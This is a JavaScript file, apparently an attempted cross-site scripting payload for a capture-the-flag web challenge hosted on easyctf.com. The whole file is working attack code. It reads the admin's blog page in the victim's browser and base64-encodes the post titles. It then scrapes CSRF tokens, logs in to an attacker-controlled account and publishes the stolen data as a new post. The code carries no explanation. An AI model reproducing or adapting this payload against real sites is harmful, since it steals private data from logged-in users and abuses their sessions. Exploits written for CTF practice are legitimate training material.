//try5
var oReq = new XMLHttpRequest();
oReq.addEventListener("load",function(){
    content = this.responseText.split("<h2><a ");
    cc = ''
    for (var i = 1; i < content.length; i++){
        cc += content[i].split("</a>")[0];
        cc += '\n';
    }
    cc = btoa(cc);
    // console.log(cc);


    var oReq = new XMLHttpRequest();
    oReq.addEventListener("load",function(){
        token = this.responseText.split('name="_csrf" value="')[1].split('"')[0];
        var oReq = new XMLHttpRequest();
        oReq.addEventListener("load",function(){
            // console.log(this.responseText);  
            var oReq = new XMLHttpRequest();
            oReq.addEventListener("load",function(){
                token = this.responseText.split('name="_csrf" value="')[1].split('"')[0];
                console.log(token)
                // var oReq = new XMLHttpRequest();
                // oReq.addEventListener("load",function(){
                    var oReq = new XMLHttpRequest();
                    oReq.addEventListener("load",function(){
                        // token = this.responseText.split('name="_csrf" value="')[1].split('"')[0];
                        // console.log(token)

                    });
                    oReq.open("POST", "http://c1.easyctf.com:12491/create-post");
                    oReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                    oReq.send("title=7mama&body=" + cc + "&_csrf=" + token);
                // });
                // oReq.open("POST", "http://c1.easyctf.com:12491/login");
                // oReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                // oReq.send("username=zip&password=zip&_csrf=" + token);

            });
            oReq.open("GET", "http://c1.easyctf.com:12491/blog/zip");
            oReq.send();
        });
        oReq.open("POST", "http://c1.easyctf.com:12491/login");
        oReq.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        oReq.send("username=zip&password=zip&_csrf=" + token);
    });
    oReq.open("GET", "http://c1.easyctf.com:12491/login");
    oReq.send();





});
oReq.open("GET", "http://c1.easyctf.com:12491/blog/admin");
oReq.send();